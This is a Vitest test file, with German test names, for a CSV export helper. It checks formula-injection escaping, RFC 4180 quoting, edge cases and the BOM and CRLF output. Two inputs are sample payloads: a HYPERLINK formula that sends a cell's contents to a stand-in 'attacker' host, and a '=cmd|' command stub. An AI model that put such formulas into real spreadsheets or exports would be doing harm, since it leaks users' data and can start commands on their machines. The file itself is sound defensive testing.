import { describe, it, expect } from 'vitest';
import { escapeCsvField, buildCsvRow, buildCsv } from '../csv';

describe('escapeCsvField — Formula-Injection-Schutz', () => {
  it('=HYPERLINK(...) bekommt Apostroph-Praefix + wird gequoted', () => {
    const input = '=HYPERLINK("http://attacker/x?b="&A1,"Bezahlt")';
    const result = escapeCsvField(input);
    expect(result.startsWith("\"'=")).toBe(true);
  });

  it('@ am Anfang wird mit Apostroph entwertet', () => {
    expect(escapeCsvField('@SUM(A1:A10)')).toMatch(/^"?'@/);
  });

  it('+ am Anfang wird entwertet', () => {
    expect(escapeCsvField('+1234')).toMatch(/^'?'\+/);
  });

  it('- am Anfang wird entwertet (Formel-Trigger, NICHT negative Zahl)', () => {
    expect(escapeCsvField('-CMD')).toMatch(/^'?'-/);
  });

  it('TAB am Anfang wird entwertet', () => {
    expect(escapeCsvField('\tEvil')).toMatch(/^"?'\t/);
  });

  it('CR am Anfang wird entwertet', () => {
    expect(escapeCsvField('\rEvil')).toMatch(/^"?'\r/);
  });

  it('Normaler Text bekommt KEINEN Apostroph', () => {
    expect(escapeCsvField('Hans Mueller')).toBe('Hans Mueller');
  });

  it('Negative Zahl als Number-Typ (-100): String "-100" wird zwar entwertet, aber String-Typ', () => {
    // Number wird zu String konvertiert, beginnt mit "-" -> wird entwertet
    expect(escapeCsvField(-100)).toMatch(/^'?'-100/);
  });
});

describe('escapeCsvField — RFC 4180 Quoting', () => {
  it('Wert mit Semikolon (Standard-Separator) wird gequoted', () => {
    expect(escapeCsvField('A;B')).toBe('"A;B"');
  });

  it('Wert mit Komma als Separator wird gequoted bei sep=,', () => {
    expect(escapeCsvField('A,B', ',')).toBe('"A,B"');
  });

  it('Wert mit Komma aber sep=; wird NICHT gequoted', () => {
    expect(escapeCsvField('A,B', ';')).toBe('A,B');
  });

  it('Anfuehrungszeichen werden verdoppelt', () => {
    expect(escapeCsvField('Sagt "Hallo"')).toBe('"Sagt ""Hallo"""');
  });

  it('Newline -> Quoting', () => {
    expect(escapeCsvField('Zeile1\nZeile2')).toBe('"Zeile1\nZeile2"');
  });

  it('CR + LF -> Quoting', () => {
    expect(escapeCsvField('A\r\nB')).toBe('"A\r\nB"');
  });
});

describe('escapeCsvField — Edge Cases', () => {
  it('null -> leerer String', () => {
    expect(escapeCsvField(null)).toBe('');
  });

  it('undefined -> leerer String', () => {
    expect(escapeCsvField(undefined)).toBe('');
  });

  it('Zahl 0 -> "0"', () => {
    expect(escapeCsvField(0)).toBe('0');
  });

  it('Boolean true -> "true"', () => {
    expect(escapeCsvField(true)).toBe('true');
  });

  it('Leerer String -> ""', () => {
    expect(escapeCsvField('')).toBe('');
  });
});

describe('buildCsvRow', () => {
  it('Drei Felder mit Default-Separator', () => {
    expect(buildCsvRow(['A', 'B', 'C'])).toBe('A;B;C');
  });

  it('Komma-Separator', () => {
    expect(buildCsvRow(['A', 'B', 'C'], ',')).toBe('A,B,C');
  });

  it('Mit Formula-Injection in einer Zelle', () => {
    const row = buildCsvRow(['Name', '=cmd|...', 'OK']);
    expect(row).toContain("'=cmd");
    expect(row.startsWith('Name;')).toBe(true);
    expect(row.endsWith(';OK')).toBe(true);
  });

  it('Mixed types', () => {
    expect(buildCsvRow(['Hans', 42, null, true])).toBe('Hans;42;;true');
  });
});

describe('buildCsv', () => {
  it('Beginnt mit BOM (UTF-8 fuer Excel)', () => {
    const csv = buildCsv([['A', 'B']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
  });

  it('Zeilen werden mit CRLF getrennt (RFC 4180)', () => {
    const csv = buildCsv([['A', 'B'], ['C', 'D']]);
    expect(csv).toContain('\r\n');
    expect(csv.endsWith('C;D')).toBe(true);
  });

  it('Header + 2 Daten-Zeilen', () => {
    const csv = buildCsv([
      ['Name', 'Betrag'],
      ['Hans', '100,00'],
      ['Eva', '50,00'],
    ]);
    const lines = csv.replace('﻿', '').split('\r\n');
    expect(lines).toEqual(['Name;Betrag', 'Hans;100,00', 'Eva;50,00']);
  });
});
